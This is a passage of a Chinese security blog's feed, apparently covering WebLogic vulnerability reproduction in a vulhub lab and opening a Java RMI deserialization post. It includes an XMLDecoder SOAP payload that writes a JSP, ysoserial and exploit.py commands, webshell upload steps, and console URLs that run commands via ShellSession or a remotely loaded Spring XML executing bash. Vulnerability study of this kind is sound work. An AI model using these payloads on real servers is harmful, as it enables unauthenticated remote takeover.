xmlns:soapenv&#x3D;&quot;http:&#x2F;&#x2F;schemas.xmlsoap.org&#x2F;soap&#x2F;envelope&#x2F;&quot;&gt;</span><br><span class="line">    &lt;soapenv:Header&gt;</span><br><span class="line">    &lt;work:WorkContext xmlns:work&#x3D;&quot;http:&#x2F;&#x2F;bea.com&#x2F;2004&#x2F;06&#x2F;soap&#x2F;workarea&#x2F;&quot;&gt;</span><br><span class="line">    &lt;java&gt;&lt;java version&#x3D;&quot;1.4.0&quot; class&#x3D;&quot;java.beans.XMLDecoder&quot;&gt;</span><br><span class="line">    &lt;object class&#x3D;&quot;java.io.PrintWriter&quot;&gt; </span><br><span class="line">    &lt;string&gt;servers&#x2F;AdminServer&#x2F;tmp&#x2F;_WL_internal&#x2F;bea_wls_internal&#x2F;9j4dqk&#x2F;war&#x2F;test.jsp&lt;&#x2F;string&gt;</span><br><span class="line">    &lt;void method&#x3D;&quot;println&quot;&gt;&lt;string&gt;</span><br><span class="line">    &lt;![CDATA[</span><br><span class="line">&lt;% out.print(&quot;test&quot;); %&gt;</span><br><span class="line">    ]]&gt;</span><br><span class="line">    &lt;&#x2F;string&gt;</span><br><span class="line">    &lt;&#x2F;void&gt;</span><br><span class="line">    &lt;void method&#x3D;&quot;close&quot;&#x2F;&gt;</span><br><span class="line">    &lt;&#x2F;object&gt;&lt;&#x2F;java&gt;&lt;&#x2F;java&gt;</span><br><span class="line">    &lt;&#x2F;work:WorkContext&gt;</span><br><span class="line">    &lt;&#x2F;soapenv:Header&gt;</span><br><span class="line">    &lt;soapenv:Body&#x2F;&gt;</span><br><span class="line">&lt;&#x2F;soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure><p><img src="../../images/java/weblogic/22.png" alt="">  </p><h1 id="Weblogic-WLS-Core-Components-反序列化命令执行漏洞（CVE-2018-2628）"><a href="#Weblogic-WLS-Core-Components-反序列化命令执行漏洞（CVE-2018-2628）" class="headerlink" title="Weblogic WLS Core Components 反序列化命令执行漏洞（CVE-2018-2628）"></a>Weblogic WLS Core Components 反序列化命令执行漏洞（CVE-2018-2628）</h1><p>漏洞描述：Oracle融合中间件的Oracle WebLogic Server组件(子组件：WLS核心组件)中的漏洞。受影响的支持版本为10.3.6.0、12.1.3.0、12.2.1.2和12.2.1.3。容易攻击的漏洞允许未经身份验证的攻击者通过T3进行网络访问，从而危及Oracle WebLogic Server。成功攻击此漏洞可导致接管Oracle WebLogic Server。</p><p>影响版本：10.3.6.0、12.1.3.0、12.2.1.2和12.2.1.3  </p><p> 首先我们来看以下 CVE-2017-3248 这个漏洞的补丁（p24667634_1036_Generic），在weblogic.rjvm.InboundMsgAbbrev$ServerChannelInputStream.class多了一个resolveProxyClass，这个resolveProxyClass只是对 RMI 接口类型进行了判断，判断 RMI 接口是否为java.rmi.registry.Registry，是的话抛出错误。<br><img src="../../images/java/weblogic/32.png" alt=""><br>这里，换个RMI 接口类型即可绕过这个补丁。可以使用java.rmi.activation.Activator来替代java.rmi.registry.Registry生成payload，即可绕过这个判断限制。<br>详情可看此文章：<a href="https://badcode.cc/2018/04/24/Weblogic-%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E-CVE-2018-2628-%E6%BC%AB%E8%B0%88/" target="_blank" rel="noopener">https://badcode.cc/2018/04/24/Weblogic-%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E-CVE-2018-2628-%E6%BC%AB%E8%B0%88/</a> </p><p>漏洞复现<br>首先下载ysoserial，并启动一个JRMP Server：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener [listen port] CommonsCollections1 [command]</span><br></pre></td></tr></table></figure><p>其中，<code>[command]</code>即为我想执行的命令，而<code>[listen port]</code>是JRMP Server监听的端口。</p><p>然后，使用exploit.py脚本，向目标Weblogic（<a href="http://your-ip:7001" target="_blank" rel="noopener">http://your-ip:7001</a> ） 发送数据包：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python exploit.py [victim ip] [victim port] [path to ysoserial] [JRMPListener ip] [JRMPListener port] [JRMPClient]</span><br></pre></td></tr></table></figure><p>其中，<code>[victim ip]</code>和<code>[victim port]</code>是目标weblogic的IP和端口，<code>[path to ysoserial]</code>是本地ysoserial的路径，<code>[JRMPListener ip]</code>和<code>[JRMPListener port]</code>第一步中启动JRMP Server的IP地址和端口。<code>[JRMPClient]</code>是执行JRMPClient的类，可选的值是JRMPClient或JRMPClient2。</p><p>exploit.py执行完成后，执行docker-compose exec weblogic bash进入容器中，可见/tmp/success已成功创建。<br><img src="../../images/java/weblogic/20.png" alt="">  </p><p>官方放出了10271的补丁，补丁如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">validate</span><span class="params">(InputStream is)</span> </span>&#123;</span><br><span class="line">   WebLogicSAXParserFactory factory = <span class="keyword">new</span> WebLogicSAXParserFactory();</span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">      SAXParser parser = factory.newSAXParser();</span><br><span class="line">      parser.parse(is, <span class="keyword">new</span> DefaultHandler() &#123;</span><br><span class="line">         <span class="keyword">private</span> <span class="keyword">int</span> overallarraylength = <span class="number">0</span>;</span><br><span class="line">         <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startElement</span><span class="params">(String uri, String localName, String qName, Attributes attributes)</span> <span class="keyword">throws</span> SAXException </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">"object"</span>)) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid element qName:object"</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">"new"</span>)) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid element qName:new"</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">"method"</span>)) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid element qName:method"</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">"void"</span>)) &#123;</span><br><span class="line">                  <span class="keyword">for</span>(<span class="keyword">int</span> attClass = <span class="number">0</span>; attClass &lt; attributes.getLength(); ++attClass) &#123;</span><br><span class="line">                     <span class="keyword">if</span>(!<span class="string">"index"</span>.equalsIgnoreCase(attributes.getQName(attClass))) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid attribute for element void:"</span> + attributes.getQName(attClass));</span><br><span class="line">                     &#125;</span><br><span class="line">                  &#125;</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">"array"</span>)) &#123;</span><br><span class="line">                  String var9 = attributes.getValue(<span class="string">"class"</span>);</span><br><span class="line">                  <span class="keyword">if</span>(var9 != <span class="keyword">null</span> &amp;&amp; !var9.equalsIgnoreCase(<span class="string">"byte"</span>)) &#123;</span><br><span class="line">                     <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"The value of class attribute is not valid for array element."</span>);</span><br><span class="line">                  &#125;</span><br></pre></td></tr></table></figure><p>这个补丁限定了object，new,method,void，array等字段，就限定了不能生成java 实例。 </p><h1 id="WebLogic-WLS核心组件反序列化漏洞（CVE-2018-2893）"><a href="#WebLogic-WLS核心组件反序列化漏洞（CVE-2018-2893）" class="headerlink" title="WebLogic WLS核心组件反序列化漏洞（CVE-2018-2893）"></a>WebLogic WLS核心组件反序列化漏洞（CVE-2018-2893）</h1><p>漏洞利用<br><a href="https://github.com/pyn3rd/CVE-2018-2893" target="_blank" rel="noopener">工具下载</a></p><p>详情可看 <a href="http://blog.topsec.com.cn/%E5%A4%A9%E8%9E%8D%E4%BF%A1%E5%85%B3%E4%BA%8Ecve-2018-2893-weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">天融信关于CVE-2018-2893 WebLogic反序列化漏洞分析</a>    </p><h1 id="CVE-2018-3245"><a href="#CVE-2018-3245" class="headerlink" title="CVE-2018-3245"></a>CVE-2018-3245</h1><p>工具下载：<a href="https://github.com/pyn3rd/CVE-2018-3245" target="_blank" rel="noopener">https://github.com/pyn3rd/CVE-2018-3245</a><br><a href="https://www.chabug.org/audit/1275.html" target="_blank" rel="noopener">Weblogic JRMP反序列化及绕过分析</a>   </p><h1 id="任意文件上传漏洞（CVE-2018-2894）"><a href="#任意文件上传漏洞（CVE-2018-2894）" class="headerlink" title="任意文件上传漏洞（CVE-2018-2894）"></a>任意文件上传漏洞（CVE-2018-2894）</h1><p>漏洞描述：Oracle融合中间件的Oracle WebLogic Server组件(子组件：WLS-Web服务)中的漏洞。受影响的支持版本是12.1.3.0、12.2.1.2和12.2.1.3。容易攻击的漏洞允许未经身份验证的攻击者通过HTTP进行网络访问，从而危及Oracle WebLogic Server。成功攻击此漏洞可导致接管Oracle WebLogic Server。CVSS3.0基础得分9.8(保密性、完整性和可用性影响)。Oracle 7月更新中，修复了Weblogic Web Service Test Page中一处任意文件上传漏洞，Web Service Test Page 在“生产模式”下默认不开启，所以该漏洞有一定限制。利用该漏洞，可以上传任意jsp文件，进而获取服务器权限。</p><p>影响版本：12.1.3.0、12.2.1.2和12.2.1.3</p><p>漏洞环境<br>执行如下命令，启动weblogic 12.2.1.3：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>环境启动后，访问<a href="http://your-ip:7001/console，即可看到后台登录页面。" target="_blank" rel="noopener">http://your-ip:7001/console，即可看到后台登录页面。</a></p><p>执行docker-compose logs | grep password可查看管理员密码，管理员用户名为weblogic。</p><p>登录后台页面，点击base_domain的配置，在“高级”中开启“启用 Web 服务测试页”选项</p><p><img src="../../images/java/weblogic/2.png" alt=""></p><p>漏洞复现<br>访问<a href="http://your-ip:7001/ws_utc/config.do，设置Work" target="_blank" rel="noopener">http://your-ip:7001/ws_utc/config.do，设置Work</a> Home Dir为<code>/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css</code>。我将目录设置为ws_utc应用的静态文件css目录，访问这个目录是无需权限的，这一点很重要。</p><p><img src="../../images/java/weblogic/3.png" alt=""></p><p>然后点击安全 -&gt; 增加，然后上传webshell：<br><img src="../../images/java/weblogic/4.png" alt=""><br>上传后，查看返回的数据包，其中有时间戳：<br><img src="../../images/java/weblogic/5.png" alt=""><br>然后访问<code>http://your-ip:7001/ws_utc/css/config/keystore/[时间戳]_[文件名]</code>，即可执行webshell：<br><img src="../../images/java/weblogic/6.png" alt=""></p><p>漏洞原理可看此文章：<a href="https://xz.aliyun.com/t/2458" target="_blank" rel="noopener">https://xz.aliyun.com/t/2458</a>   </p><h1 id="CVE-2019-2725"><a href="#CVE-2019-2725" class="headerlink" title="CVE-2019-2725"></a>CVE-2019-2725</h1><p>漏洞分析：<a href="http://xxlegend.com/2019/04/30/CVE-2019-2725%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">CVE-2019-2725 分析</a>   </p><p>详细的补丁如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">validate</span><span class="params">(InputStream is)</span> </span>&#123;</span><br><span class="line">   WebLogicSAXParserFactory factory = <span class="keyword">new</span> WebLogicSAXParserFactory();</span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">      SAXParser parser = factory.newSAXParser();</span><br><span class="line">      parser.parse(is, <span class="keyword">new</span> DefaultHandler() &#123;</span><br><span class="line">         <span class="keyword">private</span> <span class="keyword">int</span> overallarraylength = <span class="number">0</span>;</span><br><span class="line">         <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startElement</span><span class="params">(String uri, String localName, String qName, Attributes attributes)</span> <span class="keyword">throws</span> SAXException </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (qName.equalsIgnoreCase(<span class="string">"object"</span>)) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid element qName:object"</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (qName.equalsIgnoreCase(<span class="string">"class"</span>)) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid element qName:class"</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (qName.equalsIgnoreCase(<span class="string">"new"</span>)) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid element qName:new"</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (qName.equalsIgnoreCase(<span class="string">"method"</span>)) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid element qName:method"</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="keyword">if</span> (qName.equalsIgnoreCase(<span class="string">"void"</span>)) &#123;</span><br><span class="line">                  <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; attributes.getLength(); ++i) &#123;</span><br><span class="line">                     <span class="keyword">if</span> (!<span class="string">"index"</span>.equalsIgnoreCase(attributes.getQName(i))) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid attribute for element void:"</span> + attributes.getQName(i));</span><br><span class="line">                     &#125;</span><br><span class="line">                  &#125;</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">if</span> (qName.equalsIgnoreCase(<span class="string">"array"</span>)) &#123;</span><br><span class="line">                  String attClass = attributes.getValue(<span class="string">"class"</span>);</span><br><span class="line">                  <span class="keyword">if</span> (attClass != <span class="keyword">null</span> &amp;&amp; !attClass.equalsIgnoreCase(<span class="string">"byte"</span>)) &#123;</span><br><span class="line">                     <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"The value of class attribute is not valid for array element."</span>);</span><br><span class="line">                  &#125;</span><br><span class="line">                  String lengthString = attributes.getValue(<span class="string">"length"</span>);</span><br><span class="line">                  <span class="keyword">if</span> (lengthString != <span class="keyword">null</span>) &#123;</span><br><span class="line">                     <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="keyword">int</span> length = Integer.valueOf(lengthString);</span><br><span class="line">                        <span class="keyword">if</span> (length &gt;= WorkContextXmlInputAdapter.MAXARRAYLENGTH) &#123;</span><br><span class="line">                           <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Exceed array length limitation"</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">this</span>.overallarraylength += length;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="keyword">this</span>.overallarraylength &gt;= WorkContextXmlInputAdapter.OVERALLMAXARRAYLENGTH) &#123;</span><br><span class="line">                           <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Exceed over all array limitation."</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                     &#125; <span class="keyword">catch</span> (NumberFormatException var8) &#123;</span><br><span class="line">……</span><br></pre></td></tr></table></figure><h1 id="CVE-2019-2729"><a href="#CVE-2019-2729" class="headerlink" title="CVE-2019-2729"></a>CVE-2019-2729</h1><p>详情可看此文章：<a href="https://xz.aliyun.com/t/5448" target="_blank" rel="noopener">cve-2019-2729挖掘思路 - cve-2019-2725 bypass</a>  </p><p>补丁：<br>Oracle选择使用白名单而不是黑名单。 通过新引入的validateFormat()函数来实现，其中白名单规则在WorkContextFormatInfo中定义 。<br><img src="../../images/java/weblogic/34.png" alt=""></p><h1 id="Weblogic远程代码执行漏洞（CVE-2020-2546）"><a href="#Weblogic远程代码执行漏洞（CVE-2020-2546）" class="headerlink" title="Weblogic远程代码执行漏洞（CVE-2020-2546）"></a>Weblogic远程代码执行漏洞（CVE-2020-2546）</h1><p>漏洞描述：该漏洞通过T3协议实现利用、攻击者可通过此漏洞实现远程代码执行.    </p><p>影响版本：WebLogic Server 10.3.6.0.0 、WebLogic Server 12.1.3.0.0</p><h1 id="Weblogic-IIOP反序列化漏洞（CVE-2020-2551）"><a href="#Weblogic-IIOP反序列化漏洞（CVE-2020-2551）" class="headerlink" title="Weblogic IIOP反序列化漏洞（CVE-2020-2551）"></a>Weblogic IIOP反序列化漏洞（CVE-2020-2551）</h1><p><a href="https://xz.aliyun.com/t/7498" target="_blank" rel="noopener">Weblogic IIOP 协议NAT 网络绕过</a></p><h1 id="管理控制台未授权远程命令执行漏洞（CVE-2020-14882，CVE-2020-14883）"><a href="#管理控制台未授权远程命令执行漏洞（CVE-2020-14882，CVE-2020-14883）" class="headerlink" title="管理控制台未授权远程命令执行漏洞（CVE-2020-14882，CVE-2020-14883）"></a>管理控制台未授权远程命令执行漏洞（CVE-2020-14882，CVE-2020-14883）</h1><p>CVE-2020-14882允许未授权的用户绕过管理控制台的权限验证访问后台，CVE-2020-14883允许后台任意用户通过HTTP协议执行任意命令。使用这两个漏洞组成的利用链，可通过一个GET请求在远程Weblogic服务器上以未授权的任意用户身份执行命令。</p><p>影响版本：    </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Oracle WeblogicServer 10.3.6.0.0</span><br><span class="line">Oracle WeblogicServer 12.1.3.0.0</span><br><span class="line">Oracle WeblogicServer 12.2.1.3.0</span><br><span class="line">Oracle WeblogicServer 12.2.1.4.0</span><br><span class="line">Oracle WeblogicServer 14.1.1.0.0</span><br></pre></td></tr></table></figure><p>漏洞复现<br>首先测试权限绕过漏洞（CVE-2020-14882），访问以下URL，即可未授权访问到管理后台页面：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;your-ip:7001&#x2F;console&#x2F;css&#x2F;%252e%252e%252fconsole.portal</span><br></pre></td></tr></table></figure><p>访问后台后，可以发现我们现在是低权限的用户，无法安装应用，所以也无法直接执行任意代码：</p><p>此时需要利用到第二个漏洞CVE-2020-14883。这个漏洞的利用方式有两种，一是通过com.tangosol.coherence.mvel2.sh.ShellSession，二是通过com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext。</p><p>直接访问如下URL，即可利用com.tangosol.coherence.mvel2.sh.ShellSession执行命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://your-ip:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=<span class="literal">true</span>&amp;_pageLabel=&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(<span class="string">"java.lang.Runtime.getRuntime().exec('touch%20/tmp/success1');"</span>)</span><br></pre></td></tr></table></figure><p>进入容器，可以发现touch /tmp/success1已成功执行：</p><p>这个利用方法只能在Weblogic 12.2.1以上版本利用，因为10.3.6并不存在com.tangosol.coherence.mvel2.sh.ShellSession类。</p><p>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext是一种更为通杀的方法，最早在CVE-2019-2725被提出，对于所有Weblogic版本均有效。</p><p>首先，我们需要构造一个XML文件，并将其保存在Weblogic可以访问到的服务器上，如<a href="http://example.com/rce.xml：" target="_blank" rel="noopener">http://example.com/rce.xml：</a></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8" ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">   <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">   <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"pb"</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span> <span class="attr">init-method</span>=<span class="string">"start"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>bash<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>&lt;![CDATA[touch /tmp/success2]]&gt;<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后通过如下URL，即可让Weblogic加载这个XML，并执行其中的命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;your-ip:7001&#x2F;console&#x2F;css&#x2F;%252e%252e%252fconsole.portal?_nfpb&#x3D;true&amp;_pageLabel&#x3D;&amp;handle&#x3D;com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(&quot;http:&#x2F;&#x2F;example.com&#x2F;rce.xml&quot;)</span><br></pre></td></tr></table></figure><p>参考文章： </p><p><a href="https://xie1997.blog.csdn.net/article/details/103916943" target="_blank" rel="noopener">Weblogic相关漏洞</a><br><a href="https://github.com/vulhub/vulhub/blob/master/weblogic/CVE-2020-14882/README.zh-cn.md" target="_blank" rel="noopener">Weblogic 管理控制台未授权远程命令执行漏洞</a><br><a href="https://www.kumamon.fun/weblogic-CVE-2015-4852-CVE-2016-0638-CVE-2016-3510/" target="_blank" rel="noopener">从Weblogic原理上探究CVE-2015-4852、CVE-2016-0638、CVE-2016-3510究竟怎么一回事</a><br><a href="https://badcode.cc/2018/04/24/Weblogic-%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E-CVE-2018-2628-%E6%BC%AB%E8%B0%88/" target="_blank" rel="noopener">Weblogic 反序列漏洞 CVE-2018-2628 漫谈</a><br><a href="https://www.freebuf.com/vuls/178105.html" target="_blank" rel="noopener">天融信关于CVE-2018-2893 WebLogic反序列化漏洞分析</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;WebLogic是美国Oracle公司出品的一个application server，确切的说是一个基于JAVA EE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>JAVA RMI 反序列化漏洞汇总</title>
    <link href="https://blog.cfyqy.com/article/154071ea.html"/>
    <id>https://blog.cfyqy.com/article/154071ea.html</id>
    <published>2021-03-25T11:48:00.000Z</published>
    <updated>2021-03-31T16:14:26.103Z</updated>
    
    <content type="html"><![CDATA[<p>RMI（Remote Method Invocation），为远程方法调用，是允许运行在一个Java虚拟机的对象调用运行在另一个Java虚拟机上的对象的方法。 这两个虚拟机可以是运行在相同计算机上的不同进程中，也可以是运行在网络上的不同计算机中。</p><p>大部分转载此文章： <a href="https://xz.aliyun.com/t/9053" target="_blank" rel="noopener">https://xz.aliyun.com/t/9053</a>    </p><a id="more"></a>   <h1 id="RMI-的概念原理"><a href="#RMI-的概念原理" class="headerlink" title="RMI 的概念原理"></a>RMI 的概念原理</h1><p>JAVA RMI 的原理可看此文章：<a href="https://paper.seebug.org/1251/" target="_blank" rel="noopener">https://paper.seebug.org/1251/</a>   </p><p>Java RMI（Java Remote Method Invocation），是Java编程语言里一种用于实现远程过程调用的应用程序编程接口。它使客户机上运行的程序可以调用远程服务器上的对象。远程方法调用特性使Java编程人员能够在网络环境中分布操作。RMI全部的宗旨就是尽可能简化远程接口对象的使用。</p><p>从客户端-服务器模型来看，客户端程序直接调用服务端，两者之间是通过JRMP（ Java Remote Method Protocol）协议通信，这个协议类似于HTTP协议，规定了客户端和服务端通信要满足的规范。</p><p>在RMI中对象是通过序列化方式进行编码传输的</p><p>RMI分为三个主体部分：</p><ul><li>Client-客户端：客户端调用服务端的方法</li><li>Server-服务端：远程调用方法对象的提供者，也是代码真正执行的地方，执行结束会返回给客户端一个方法执行的结果</li><li>Registry-注册中心：其实本质就是一个map，相当于是字典一样，用于客户端查询要调用的方法的引用，在低版本的JDK中，Server与Registry是可以不在一台服务器上的，而在高版本的JDK中，Server与Registry只能在一台服务器上，否则无法注册成功</li></ul><p>总体RMI的调用实现目的就是调用远程机器的类跟调用一个写在自己的本地的类一样</p><p>唯一区别就是RMI服务端提供的方法，被调用的时候该方法是执行在服务端</p><p><img src="../../images/java/rmi/1.png" alt=""></p><p>RMI客户端与服务端实现<br>1.服务端编写一个远程接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">rmi</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个接口需要</p><ul><li>使用public声明，否则客户端在尝试加载实现远程接口的远程对象时会出错。（如果客户端、服务端放一起没关系）</li><li>同时需要继承Remote类</li><li>接口的方法需要声明java.rmi.RemoteException报错</li></ul><p>服务端实现这个远程接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RemoteClass</span> <span class="keyword">extends</span> <span 